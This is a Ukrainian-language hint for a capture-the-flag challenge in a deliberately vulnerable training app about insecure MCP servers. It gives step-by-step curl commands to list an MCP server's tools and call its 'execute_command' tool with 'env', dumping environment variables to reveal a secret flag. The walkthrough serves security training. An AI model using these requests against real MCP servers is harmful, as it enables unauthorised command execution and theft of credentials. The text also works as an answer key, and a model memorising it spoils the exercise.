=== Підказка до завдання 60

Цей виклик демонструє, як незахищений сервер MCP (Model Context Protocol) може розголошувати витік секретів, що зберігаються у змінних середовища.

**Де шукати:**

1. **Окремий MCP-сервер працює на порту 8090** — відмінному від основного порту програми (8080)
2. **Сервер MCP реалізує протокол JSON-RPC 2.0**, як визначено специфікацією MCP.
3. **Почніть зі складання списку доступних інструментів** за допомогою методу `tools/list`
4. **Викличте інструмент `execute_command`** — він поверне змінні середовища сервера

**Покроковий підхід:**

Спочатку перелічіть інструменти, які пропонує сервер MCP:

[source,bash]
----
curl -s -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
----

Потім викличте `execute_command` з будь-якою командою оболонки (наприклад, `env`):

[source,bash]
----
curl -s -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
----

**На що звернути увагу:**

- Знайдіть ключ `WRONGSECRETS_MCP_SECRET` у повернутому дампі змінної середовища
- Значення поруч є відповіддю на цей виклик

**Пам’ятайте:** Кінцева точка також доступна на головному порту — спробуйте `/mcp`, якщо порт 8090 недоступний.
